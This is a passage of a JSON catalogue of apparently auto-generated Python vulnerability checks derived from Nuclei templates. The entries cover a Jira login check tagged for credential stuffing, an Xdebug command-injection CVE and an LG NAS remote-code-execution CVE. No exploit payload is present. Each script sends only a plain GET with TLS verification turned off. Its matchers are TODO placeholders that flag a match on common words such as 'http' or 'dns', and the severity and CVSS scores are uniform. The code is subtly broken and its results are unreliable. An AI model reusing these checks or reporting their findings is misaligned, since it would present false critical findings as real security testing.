1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "self-hosted",
          "creds-stuffing",
          "login-check",
          "grafana",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_jira_login_check",
        "name": "Jira Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid login on self hosted Jira instance.",
        "severity": "critical",
        "detection": "[AND] mot(s) '\"loginSucceeded\":true' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "{{username}}"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{password}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jira-login-check\nName: Jira Login Check\nSeverity: critical\nDescription: Checks for a valid login on self hosted Jira instance.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jira_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jira-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Jira Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"loginSucceeded\":true\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"loginSucceeded\":true']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jira Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jira_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: jira-login-check\nName: Jira Login Check\nSeverity: critical\nDescription: Checks for a valid login on self hosted Jira instance.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_jira_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"jira-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Jira Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"loginSucceeded\":true\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"loginSucceeded\":true']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Jira Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_jira_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "creds-stuffing",
          "login-check",
          "self-hosted",
          "jira",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2015_10141",
        "name": "Xdebug <= 2.5.5 - Command Injection",
        "language": "Python",
        "famille": "CVE",
        "description": "Xdebug <= 2.5.5 contains an unauthenticated command injection caused by accepting debugger protocol commands without authentication when remote debugging is enabled, letting remote attackers execute arbitrary PHP code and system commands, exploit requires remote debugging enabled.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'dns' | mot(s) 'Set-Cookie: XDEBUG_SESSION={{randstr}}' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2015-10141\nName: Xdebug <= 2.5.5 - Command Injection\nSeverity: critical\nDescription: Xdebug <= 2.5.5 contains an unauthenticated command injection caused by accepting debugger protocol commands without authentication when remote debugging is enabled, letting remote attackers execute arbitrary PHP code and system commands, exploit requires remote debugging enabled.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2015_10141:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2015-10141\"\n    SEVERITY = \"critical\"\n    NAME = \"Xdebug <= 2.5.5 - Command Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | mot(s) 'Set-Cookie: XDEBUG_SESSION={{randstr}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', 'Set-Cookie: XDEBUG_SESSION={{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Xdebug <= 2.5.5 - Command Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2015_10141(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2015-10141\nName: Xdebug <= 2.5.5 - Command Injection\nSeverity: critical\nDescription: Xdebug <= 2.5.5 contains an unauthenticated command injection caused by accepting debugger protocol commands without authentication when remote debugging is enabled, letting remote attackers execute arbitrary PHP code and system commands, exploit requires remote debugging enabled.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2015_10141:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2015-10141\"\n    SEVERITY = \"critical\"\n    NAME = \"Xdebug <= 2.5.5 - Command Injection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'dns' | mot(s) 'Set-Cookie: XDEBUG_SESSION={{randstr}}' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['dns', 'Set-Cookie: XDEBUG_SESSION={{randstr}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Xdebug <= 2.5.5 - Command Injection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2015_10141(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [
          "CVE-2015-10141"
        ],
        "tags": [
          "cve",
          "cve2015",
          "oast",
          "rce",
          "vulhub",
          "php",
          "debug",
          "xdebug",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_c_v_e_2018_10818",
        "name": "LG NAS Devices - Remote Code Execution",
        "language": "Python",
        "famille": "CVE",
        "description": "LG NAS devices contain a pre-auth remote command injection via the \"password\" parameter.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'http' | mot(s) 'User-Agent: {{useragent}}'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          },
          {
            "name": "useragent",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: useragent",
            "default": "{{rand_base(6)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: CVE-2018-10818\nName: LG NAS Devices - Remote Code Execution\nSeverity: critical\nDescription: LG NAS devices contain a pre-auth remote command injection via the \"password\" parameter.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_CVE_2018_10818:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"CVE-2018-10818\"\n    SEVERITY = \"critical\"\n    NAME = \"LG NAS Devices - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'User-Agent: {{useragent}}'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'User-Agent: {{useragent}}']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"LG NAS Devices - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_CVE_2018_10818(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
